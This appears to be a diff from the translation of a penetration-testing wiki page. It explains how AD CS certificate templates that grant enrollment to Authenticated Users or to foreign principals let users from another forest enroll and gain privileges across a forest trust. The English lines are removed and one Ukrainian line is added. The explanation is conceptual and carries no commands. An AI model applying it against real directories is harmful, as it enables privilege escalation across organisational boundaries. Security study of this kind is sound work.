-Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.
-
-Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.
+Обидва сценарії призводять до **збільшення площі атаки** з одного лісу в інший. Налаштування шаблону сертифіката можуть бути використані зловмисником для отримання додаткових привілеїв в іноземному домені.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../../banners/hacktricks-training.md}}
-
